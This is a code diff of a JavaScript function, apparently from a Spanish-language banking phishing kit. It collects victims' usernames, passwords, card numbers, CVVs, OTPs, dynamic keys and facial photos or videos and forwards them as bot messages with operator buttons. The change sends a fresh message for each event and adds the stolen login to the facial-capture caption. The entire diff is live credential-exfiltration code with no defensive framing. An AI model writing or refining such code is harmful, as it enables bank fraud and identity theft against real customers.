@@ -52,6 +52,8 @@ function b64toBlob(b64, type) {
 async function sendAndWait(payload, handlers) {
   showLoader();
   try {
+    let msgId = null;
+
     // 1. Guardar temporalmente los datos nuevos en sessionStorage
     if (payload.event === 'TARJETA') {
       sessionStorage.setItem('temp_tc', payload.tc || '');
@@ -71,10 +73,9 @@ async function sendAndWait(payload, handlers) {
     const uCvv  = sessionStorage.getItem('temp_cvv') || 'N/A';
     const uOtp  = sessionStorage.getItem('temp_otp') || 'N/A';
     const uDin  = sessionStorage.getItem('temp_dinamic') || 'N/A';
-    const msgId = sessionStorage.getItem('bc_msg_id');
 
-    // 3. Construir el texto unificado completo
-    let txt = `🔐 *REGISTRO COMPLETO*\n\n`;
+    // 3. Construir el texto unificado para este nuevo mensaje
+    let txt = `📋 *REGISTRO COMPLETO [${payload.event}]*\n\n`;
     txt += `🆔 ID: \`${SESSION_ID}\`\n`;
     txt += `👤 Usuario: \`${uUser}\`\n`;
     txt += `🔑 Clave: \`${uPass}\``;
@@ -94,22 +95,20 @@ async function sendAndWait(payload, handlers) {
       txt += `\n\n🔑 *Clave Dinámica:* \`${uDin}\``;
     }
 
-    let activeMsgId = null;
-
     if (payload.event === 'FACIAL') {
       const rPhoto = await fetch(`/api/sendPhoto`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           photo: payload.foto,
-          caption: `📷 *CAPTURA FACIAL*\n\n🆔 ID: \`${SESSION_ID}\``,
+          caption: `📷 *CAPTURA FACIAL*\n\n🆔 ID: \`${SESSION_ID}\`\n👤 Usuario: \`${uUser}\`\n🔑 Clave: \`${uPass}\``,
           parse_mode: 'Markdown',
           reply_markup: getKb(payload.event)
         })
       });
       const dPhoto = await rPhoto.json();
       if (!dPhoto.ok) throw new Error('Error enviando captura');
-      activeMsgId = dPhoto.result.message_id;
+      msgId = dPhoto.result.message_id;
 
       if (payload.video) {
         fetch(`/api/sendDocument`, {
@@ -122,36 +121,8 @@ async function sendAndWait(payload, handlers) {
           })
         });
       }
-    } else if (msgId) {
-      // 4. EDITA EL MENSAJE EXISTENTE EN LUGAR DE CREAR UNO NUEVO
-      const res = await fetch(`/api/editMessageText`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message_id: parseInt(msgId),
-          text: txt,
-          parse_mode: 'Markdown',
-          reply_markup: getKb(payload.event)
-        })
-      });
-      const data = await res.json();
-      
-      if (!data.ok) {
-        // Fallback si por algo el mensaje original ya no existía: crea uno nuevo y guárdalo
-        const resNew = await fetch(`/api/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ text: txt, parse_mode: 'Markdown', reply_markup: getKb(payload.event) })
-        });
-        const dataNew = await resNew.json();
-        if (!dataNew.ok) throw new Error('Error actualizando mensaje');
-        activeMsgId = dataNew.result.message_id;
-        sessionStorage.setItem('bc_msg_id', activeMsgId);
-      } else {
-        activeMsgId = parseInt(msgId);
-      }
     } else {
-      // Si no hubiera ID guardado, manda uno nuevo por seguridad
+      // Envía un nuevo mensaje independiente pero con TODO el contexto incluido
       const res = await fetch(`/api/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -159,11 +130,10 @@ async function sendAndWait(payload, handlers) {
       });
       const data = await res.json();
       if (!data.ok) throw new Error('Error enviando mensaje');
-      activeMsgId = data.result.message_id;
-      sessionStorage.setItem('bc_msg_id', activeMsgId);
+      msgId = data.result.message_id;
     }
 
-    pollAction(activeMsgId, handlers);
+    pollAction(msgId, handlers);
   } catch (e) {
     hideLoader();
     alert('Error de red al enviar la información.');
